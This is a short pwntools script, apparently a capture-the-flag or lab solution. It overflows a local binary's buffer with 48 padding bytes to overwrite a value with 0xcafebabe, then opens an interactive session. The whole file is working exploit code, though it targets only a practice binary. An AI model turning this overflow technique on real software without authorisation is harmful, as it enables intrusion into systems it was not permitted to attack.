#!/usr/bin/env python3

from pwn import *

binary = './a.out'
target_value = 0xcafebabe
offset = 48 
padding = b'A' * offset
payload = padding + p32(target_value)

p = process(binary)

p.sendline(payload)
p.interactive()